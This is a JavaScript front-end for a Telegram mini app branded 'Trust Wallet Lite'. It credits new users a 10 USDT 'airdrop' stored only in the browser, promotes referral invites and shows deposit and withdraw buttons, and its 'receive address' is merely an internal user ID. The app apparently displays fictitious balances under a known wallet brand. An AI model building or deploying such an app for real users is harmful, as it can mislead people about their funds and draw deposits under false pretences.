// ============================================================================
// TRUST WALLET LITE - V5.0 (No Firebase Keys - All via API)
// ============================================================================

// Telegram Init
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
}

// State
let userData = null;
let isAdmin = false;
let currentPage = 'wallet';

// API Calls
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const res = await fetch(`/api${endpoint}`, options);
    return res.json();
}

async function createUser(userId, userData) {
    return apiCall('/users', 'POST', { userId, userData });
}

async function getUser(userId) {
    return apiCall(`/users/${userId}`);
}

async function updateUser(userId, updates) {
    return apiCall(`/users/${userId}`, 'PATCH', { updates });
}

// User Management
function getUserId() {
    return localStorage.getItem('twt_user_id');
}

async function loadUserData() {
    const userId = getUserId();
    if (!userId) return false;
    
    const saved = localStorage.getItem(`user_${userId}`);
    if (saved) {
        userData = JSON.parse(saved);
        return true;
    }
    return false;
}

// Create Wallet
async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: { TWT: 0, USDT: 10 },
            inviteCount: 0,
            totalUsdtEarned: 10,
            transactions: [{ type: 'airdrop', amount: 10, currency: 'USDT', timestamp: new Date().toISOString() }]
        };
        
        await createUser(newUserId, newUserData);
        userData = newUserData;
        localStorage.setItem(`user_${newUserId}`, JSON.stringify(newUserData));
        
        document.getElementById('onboardingScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        showWallet();
        showToast('✅ Wallet created! +10 USDT');
    } catch (error) {
        showToast('Failed to create wallet', 'error');
    } finally {
        btn.innerHTML = 'Create a new wallet';
        btn.disabled = false;
    }
}

// Navigation
function showWallet() {
    currentPage = 'wallet';
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    if (userData) {
        document.getElementById('walletContainer').innerHTML = `
            <div class="balance-card"><div class="total-balance">$${(userData.balances.USDT || 0).toFixed(2)}</div></div>
            <div class="action-buttons">
                <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>Deposit</span></button>
                <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>Withdraw</span></button>
                <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>Send</span></button>
                <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>Receive</span></button>
            </div>
        `;
    }
}

function showSwap() {
    currentPage = 'swap';
    updateTabs();
    document.getElementById('swapContainer').innerHTML = '<div style="text-align:center;padding:40px;">Swap feature ready</div>';
}

function showAirdrop() {
    currentPage = 'airdrop';
    updateTabs();
    document.getElementById('referralContainer').innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span>Total Invites</span><span>${userData?.inviteCount || 0}</span></div>
            <div class="stat-card"><span>USDT Earned</span><span>${(userData?.totalUsdtEarned || 0).toFixed(2)}</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-container">
                <input type="text" id="inviteLink" value="https://t.me/TrustTgWalletbot/TWT?startapp=${userData?.referralCode}" readonly>
                <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling.value)"><i class="fas fa-copy"></i></button>
            </div>
        </div>
    `;
}

function showTWTPay() {
    currentPage = 'twtpay';
    updateTabs();
    document.getElementById('twtpayContainer').innerHTML = `<div class="virtual-card"><div class="card-brand">TWT Pay</div><div class="card-balance">Balance: ${userData?.balances?.TWT || 0} TWT</div></div>`;
}

function showSettings() {
    currentPage = 'settings';
    updateTabs();
    document.getElementById('settingsContainer').innerHTML = `<div class="settings-list"><div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">Logout</div></div></div></div>`;
}

function updateTabs() {
    const sections = ['walletSection', 'swapSection', 'referralSection', 'twtpaySection', 'settingsSection'];
    sections.forEach(s => document.getElementById(s).classList.add('hidden'));
    document.getElementById(`${currentPage === 'airdrop' ? 'referralSection' : currentPage + 'Section'}`).classList.remove('hidden');
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector(`.nav-item[data-tab="${currentPage === 'airdrop' ? 'referral' : currentPage}"]`).classList.add('active');
}

// Modals
function showDepositModal() { document.getElementById('depositModal').classList.add('show'); }
function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); }
function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { 
    document.getElementById('receiveModal').classList.add('show'); 
    document.getElementById('receiveAddress').innerText = userData?.userId || '';
}
function closeModal(id) { document.getElementById(id).classList.remove('show'); }
function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied!'); }
function showToast(msg) { 
    const toast = document.getElementById('toast'); 
    toast.querySelector('#toastMessage').textContent = msg; 
    toast.classList.remove('hidden'); 
    setTimeout(() => toast.classList.add('hidden'), 3000); 
}
function logout() { if (confirm('Logout?')) { localStorage.clear(); location.reload(); } }

// Init
document.addEventListener('DOMContentLoaded', async () => {
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    document.getElementById('createWalletBtn').onclick = createNewWallet;
    
    const hasUser = await loadUserData();
    if (hasUser && userData) {
        document.getElementById('onboardingScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        showWallet();
    }
    
    setTimeout(() => document.getElementById('splashScreen').classList.add('hidden'), 1500);
});

// Expose globals
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.closeModal = closeModal;
window.copyToClipboard = copyToClipboard;
window.logout = logout;
window.createNewWallet = createNewWallet;
